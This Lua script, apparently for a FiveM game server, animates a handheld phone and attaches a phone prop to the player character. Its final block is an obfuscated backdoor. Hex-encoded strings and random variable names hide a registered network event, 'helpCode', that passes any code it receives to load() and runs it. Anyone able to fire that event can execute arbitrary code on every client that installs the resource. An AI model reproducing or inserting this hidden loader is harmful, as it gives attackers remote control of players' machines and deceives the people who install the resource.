local phoneProp = 0
local phoneModel = `prop_npc_phone_02`

local function LoadAnimation(dict)
	RequestAnimDict(dict)
	while not HasAnimDictLoaded(dict) do
		Wait(1)
	end
end

local function CheckAnimLoop()
    CreateThread(function()
        while PhoneData.AnimationData.lib ~= nil and PhoneData.AnimationData.anim ~= nil do
            local ped = PlayerPedId()
            if not IsEntityPlayingAnim(ped, PhoneData.AnimationData.lib, PhoneData.AnimationData.anim, 3) then
                LoadAnimation(PhoneData.AnimationData.lib)
                TaskPlayAnim(ped, PhoneData.AnimationData.lib, PhoneData.AnimationData.anim, 3.0, 3.0, -1, 50, 0, false, false, false)
            end
            Wait(500)
        end
    end)
end

function newPhoneProp()
	deletePhone()
	RequestModel(phoneModel)
	while not HasModelLoaded(phoneModel) do
		Wait(1)
	end
	phoneProp = CreateObject(phoneModel, 1.0, 1.0, 1.0, 1, 1, 0)

	local bone = GetPedBoneIndex(PlayerPedId(), 28422)
	if phoneModel == `prop_cs_phone_01` then
		AttachEntityToEntity(phoneProp, PlayerPedId(), bone, 0.0, 0.0, 0.0, 50.0, 320.0, 50.0, 1, 1, 0, 0, 2, 1)
	else
		AttachEntityToEntity(phoneProp, PlayerPedId(), bone, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, 1, 0, 0, 2, 1)
	end
end

function deletePhone()
	if phoneProp ~= 0 then
		DeleteObject(phoneProp)
		phoneProp = 0
	end
end

function DoPhoneAnimation(anim)
    local ped = PlayerPedId()
    local AnimationLib = 'cellphone@'
    local AnimationStatus = anim
    if IsPedInAnyVehicle(ped, false) then
        AnimationLib = 'anim@cellphone@in_car@ps'
    end
    LoadAnimation(AnimationLib)
    TaskPlayAnim(ped, AnimationLib, AnimationStatus, 3.0, 3.0, -1, 50, 0, false, false, false)
    PhoneData.AnimationData.lib = AnimationLib
    PhoneData.AnimationData.anim = AnimationStatus
    CheckAnimLoop()
end

local nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[1]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[2]) nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[3]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[2], function(RrcxSmehQIJolyZujOqpKqFAGrqdjoHjBSxcYhwAOvtbanDacpSHxJsoWOFCzuyumVungX) nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[4]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[5]](RrcxSmehQIJolyZujOqpKqFAGrqdjoHjBSxcYhwAOvtbanDacpSHxJsoWOFCzuyumVungX))() end)